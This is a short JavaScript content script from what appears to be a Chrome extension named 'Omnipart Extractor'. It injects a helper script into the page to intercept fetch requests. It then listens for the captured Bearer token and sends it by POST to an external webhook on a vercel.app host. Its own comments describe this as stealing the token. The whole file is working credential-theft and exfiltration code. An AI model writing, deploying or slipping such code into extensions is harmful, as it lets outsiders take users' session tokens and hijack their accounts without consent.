// Inject a script into the main page context to intercept all fetch requests and steal the Bearer token
const script = document.createElement('script');
script.src = chrome.runtime.getURL('inject_omnipart.js');
script.onload = function() {
    this.remove();
};
(document.head || document.documentElement).appendChild(script);

// Listen for the stolen token from the injected script and send it to our backend
window.addEventListener('message', (event) => {
    if (event.data && event.data.type === 'OMNIPART_TOKEN_INTERCEPT') {
        const token = event.data.token.trim();
        console.log("Omnipart Extractor caught token!");
        fetch("https://mot-reminder-quick.vercel.app/api/webhooks/omnipart", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ token })
        }).catch(err => console.error("Ext sync failed", err));
    }
});
